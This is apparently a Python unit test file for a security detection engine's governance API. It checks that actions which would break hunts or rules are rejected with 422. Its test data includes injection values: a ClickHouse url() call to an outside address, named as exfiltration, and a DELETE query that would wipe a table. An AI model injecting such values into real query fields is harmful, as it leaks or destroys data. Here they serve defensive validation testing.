#  Project:      dfe-engine
#  File:         tests/unit/test_api/test_action_hunt_documents_api.py
#  Purpose:      Invoking an action that would break a hunt answers 422 and writes nothing
#  Language:     Python
#
#  License:      BUSL-1.1
#  Copyright:    (c) 2026 HYPERI PTY LIMITED
"""POST /governance/actions/{name}/invoke refuses a hunt document the hunts API refuses.

The hunt runner compiles the deploy repo's hunts directly, so an action is held to
the hunts API's validation. The refusal is 422 ``invalid_document`` with the
validator's message, before any review routing. The address below is in the
documentation range (RFC 5737).
"""

import pytest

from dfe_engine.gitcrud import GitCrud, default_registry
from dfe_engine.gitops.repo import GitopsRepo
from dfe_engine.governance import PolicyStore

_HUNT = {
    "display_name": "Certutil Abuse",
    "cron": "*/5 * * * *",
    "log_buffer": 60,
    "customers": ["org_a"],
    "global_source_table_name": "dfe.main",
    "global_target_table_name": "dfe.detection",
    "rules": [{"rule_name": "certutil"}],
}

_RULE = {
    "rule_id": "certutil",
    "name": "Certutil",
    "severity": "high",
    "source_db": "dfe",
    "source_table": "main",
    "where_clause": "process_name = 'certutil.exe'",
}

_EXFIL = "url('http://203.0.113.9/x', 'JSONEachRow')"


def _wire(app, tmp_path) -> GitCrud:
    app.state.settings.env = "dev"
    crud = GitCrud(GitopsRepo(local_path=str(tmp_path / "deploy"), push=False), default_registry())
    app.state.gitcrud = crud
    app.state.policy_store = PolicyStore(crud)
    crud.put("hunts", "windows_hunt", dict(_HUNT), actor="admin")
    return crud


def _wire_rule(app, tmp_path) -> GitCrud:
    app.state.settings.env = "dev"
    crud = GitCrud(GitopsRepo(local_path=str(tmp_path / "deploy"), push=False), default_registry())
    app.state.gitcrud = crud
    app.state.policy_store = PolicyStore(crud)
    crud.put("rules", "certutil", dict(_RULE), actor="admin")
    return crud


def _define(client, headers, path: str, value) -> None:
    action = {
        "name": "repoint",
        "description": "repoint the hunt",
        "required_action": "action:invoke:repoint",
        "changes": [{"cls": "hunts", "name": "windows_hunt", "path": path, "value": value}],
    }
    created = client.post("/api/v1/governance/admin/actions", json=action, headers=headers)
    assert created.status_code == 201, created.text


def _define_rule(client, headers, path: str, value) -> None:
    action = {
        "name": "retune",
        "description": "retune the rule",
        "required_action": "action:invoke:retune",
        "changes": [{"cls": "rules", "name": "certutil", "path": path, "value": value}],
    }
    created = client.post("/api/v1/governance/admin/actions", json=action, headers=headers)
    assert created.status_code == 201, created.text


@pytest.mark.parametrize("dry_run", [False, True], ids=["invoke", "dry run"])
@pytest.mark.parametrize(
    ("path", "value", "message"),
    [
        ("global_source_table_name", "url('http://203.0.113.9/x', 'CSV')", "is not a table name"),
        ("query", "ALTER TABLE dfe.main DELETE WHERE 1", "must be a SELECT"),
    ],
    ids=["source", "query"],
)
def test_an_action_that_breaks_a_hunt_is_422(
    client, app, admin_headers, tmp_path, path, value, message, dry_run
):
    crud = _wire(app, tmp_path)
    _define(client, admin_headers, path, value)

    resp = client.post(
        "/api/v1/governance/actions/repoint/invoke",
        params={"dry_run": dry_run},
        headers=admin_headers,
    )

    assert resp.status_code == 422, resp.text
    body = resp.json()
    assert body["code"] == "invalid_document"
    assert body["message"].startswith("hunts/windows_hunt: ")
    assert message in body["message"]
    assert crud.get("hunts", "windows_hunt") == _HUNT


def test_an_action_that_keeps_the_hunt_valid_is_applied(client, app, admin_headers, tmp_path):
    crud = _wire(app, tmp_path)
    _define(client, admin_headers, "global_source_table_name", "dfe.cisco-ios")

    resp = client.post("/api/v1/governance/actions/repoint/invoke", headers=admin_headers)

    assert resp.status_code == 200, resp.text
    assert crud.get("hunts", "windows_hunt")["global_source_table_name"] == "dfe.cisco-ios"


def test_an_action_that_breaks_a_rules_condition_is_422(client, app, admin_headers, tmp_path):
    crud = _wire_rule(app, tmp_path)
    _define_rule(client, admin_headers, "where_clause", _EXFIL)

    resp = client.post("/api/v1/governance/actions/retune/invoke", headers=admin_headers)

    assert resp.status_code == 422, resp.text
    body = resp.json()
    assert body["code"] == "invalid_document"
    assert body["message"].startswith("rules/certutil: ")
    assert "may not call url()" in body["message"]
    assert crud.get("rules", "certutil") == _RULE


def test_an_action_that_leaves_an_ordinary_condition_is_applied(
    client, app, admin_headers, tmp_path
):
    crud = _wire_rule(app, tmp_path)
    _define_rule(client, admin_headers, "where_clause", "process_name = 'notepad.exe'")

    resp = client.post("/api/v1/governance/actions/retune/invoke", headers=admin_headers)

    assert resp.status_code == 200, resp.text
    assert crud.get("rules", "certutil")["where_clause"] == "process_name = 'notepad.exe'"
